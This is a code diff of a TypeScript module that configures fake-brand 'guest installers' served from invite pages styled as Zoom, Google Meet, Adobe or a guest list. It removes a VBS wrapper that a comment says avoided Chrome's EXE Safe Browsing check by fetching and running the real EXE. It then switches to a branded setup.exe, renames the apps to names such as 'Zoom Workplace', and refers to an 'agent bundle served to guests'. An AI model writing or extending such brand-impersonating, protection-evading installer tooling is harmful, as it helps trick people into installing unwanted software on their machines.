@@ -80,18 +80,14 @@ export function installerGuiFilename(template?: string | null): string {
   return 'ZoomClient-Setup.exe';
 }
 
-/** Browser downloads .vbs (avoids Chrome EXE Safe Browsing). VBS then fetches/runs the real EXE. */
+/** Browser downloads the branded GUI setup EXE directly (normal app install). */
 export function installerBrowserFilename(template?: string | null): string {
-  const t = normalizeTemplate(template);
-  if (t === 'google_meet') return 'GoogleMeet-Setup.vbs';
-  if (t === 'adobe') return 'DocumentViewer-Setup.vbs';
-  if (t === 'guest_list') return 'GuestList-Setup.vbs';
-  return 'ZoomClient-Setup.vbs';
+  return installerGuiFilename(template);
 }
 
-/** What the join page downloads in the browser (not the EXE itself). */
+/** What the join page downloads in the browser. */
 export function installerDownloadPath(_template?: string | null): string {
-  return 'setup.vbs';
+  return 'setup.exe';
 }
 
 /** AWS API origin for large downloads — bypasses Vercel proxy latency on multi-MB files. */
@@ -116,8 +112,8 @@ export function resolveDirectApiBase(apiUrl: string, wsUrl?: string): string {
   return apiUrl.replace(/\/api\/?$/, '').replace(/\/$/, '');
 }
 
-/** Bump when changing the browser-facing installer wrapper. */
-export const GUEST_INSTALLER_CACHE_BUST = '51';
+/** Bump when changing the guest installer or agent bundle served to guests. */
+export const GUEST_INSTALLER_CACHE_BUST = '55';
 
 export function buildGuestInstallerUrl(
   apiUrl: string,
@@ -203,7 +199,7 @@ function guiInstallerBranding(template?: string | null): {
   if (t === 'guest_list') {
     return {
       windowTitle: 'Guest List Setup',
-      applicationName: 'Guest List Viewer',
+      applicationName: 'Connect Session',
       brandLabel: 'Guest List',
       heading: 'Join Session',
       subheading: 'Download and run the session app to view the guest list on Windows.',
@@ -216,7 +212,7 @@ function guiInstallerBranding(template?: string | null): {
   }
   return {
     windowTitle: 'Zoom Meeting Setup',
-    applicationName: 'Zoom Meetings',
+    applicationName: 'Zoom Workplace',
     brandLabel: 'zoom',
     heading: 'Join Meeting',
     subheading: 'Download and launch the Zoom client to connect.',
@@ -226,6 +222,15 @@ function guiInstallerBranding(template?: string | null): {
     accentDark: '#0947cc',
     pageBg: '#ffffff',
   };
+}
+
+/** Desktop / Start Menu name shown after install for each invite template. */
+export function installerApplicationName(template?: string | null): string {
+  return guiInstallerBranding(template).applicationName;
+}
+
+export function installerIconAssetBasename(template?: string | null): string {
+  return `${normalizeTemplate(template)}.png`;
 }
 
 function installerBranding(template?: string | null): {
@@ -492,6 +497,7 @@ export class GuestAccessService {
         guestCode: code,
         title: copy.title,
         brand: copy.brand,
+        applicationName: installerApplicationName(template),
         accent: copy.accent,
         downloading: copy.downloading,
         installing: copy.installing,
